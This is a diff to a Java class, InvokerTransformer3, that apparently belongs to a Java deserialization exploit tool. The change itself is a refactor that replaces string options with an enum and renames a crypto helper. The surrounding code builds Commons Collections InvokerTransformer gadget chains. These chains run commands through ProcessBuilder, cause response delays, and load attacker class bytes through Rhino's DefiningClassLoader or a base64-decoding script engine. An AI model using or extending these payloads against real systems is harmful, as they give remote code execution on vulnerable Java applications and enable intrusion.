@@ -3,9 +3,10 @@ package com.ppp.sinks;
 import com.ppp.JavaClassBuilder;
 import com.ppp.JavaClassHelper;
 import com.ppp.Printer;
+import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
-import com.ppp.utils.maker.CryptoProcessor;
+import com.ppp.utils.maker.CryptoUtils;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
@@ -57,11 +58,11 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.ProcessBuilder})
     public Transformer[] processBuilder(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
-        String os = sinksHelper.getOs();
+        EnchantEnums os = sinksHelper.getOs();
         Printer.greenInfo("command: " + command);
 
         Transformer[] transformers = new Transformer[0];
-        if (os != null && os.toLowerCase().contains(EnchantType.WIN)) {
+        if (os != null && os.equals(EnchantEnums.WIN)) {
             Printer.greenInfo("os: " + os);
             transformers = new Transformer[]{
                     new ConstantTransformer(ProcessBuilder.class),
@@ -135,13 +136,13 @@ public class InvokerTransformer3 {
      */
     @EnchantType({EnchantType.Delay})
     public Transformer[] delay(SinksHelper sinksHelper) {
-        String delay = sinksHelper.getDelay();
+        EnchantEnums delay = sinksHelper.getDelay();
         Long delayTime = sinksHelper.getDelayTime();
 
         Printer.greenInfo(String.format("System will delay response for %s seconds", delayTime));
 
         Transformer[] transformers = null;
-        if (delay != null && delay.equalsIgnoreCase("timeunit")) {
+        if (delay != null && delay.equals(EnchantEnums.Timeunit)) {
             transformers = new Transformer[]{
                     new ConstantTransformer(TimeUnit.class),
                     new InvokerTransformer("getDeclaredField", new Class[]{
@@ -295,7 +296,7 @@ public class InvokerTransformer3 {
      */
     @EnchantType({EnchantType.LocalLoad})
     public Transformer[] localLoad(SinksHelper sinksHelper) throws Exception {
-        String loadFunction = sinksHelper.getLoadFunction();
+        EnchantEnums loadFunction = sinksHelper.getLoadFunction();
 
         /**
          * 字节码加载
@@ -318,7 +319,7 @@ public class InvokerTransformer3 {
         }
 
         Transformer[] transformers;
-        if (loadFunction != null && loadFunction.equalsIgnoreCase(EnchantType.RHINO)) {
+        if (loadFunction != null && loadFunction.equals(EnchantEnums.RHINO)) {
             Printer.greenInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
             /**
              * org.mozilla.javascript.DefiningClassLoader.defineClass()
@@ -337,7 +338,7 @@ public class InvokerTransformer3 {
             /**
              * javax.script.ScriptEngineManager
              */
-            String b64 = CryptoProcessor.base64encoder(classBytes);
+            String b64 = CryptoUtils.base64encoder(classBytes);
 
             String code = "var data=\"" + b64 + "\";\n" +
                     "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
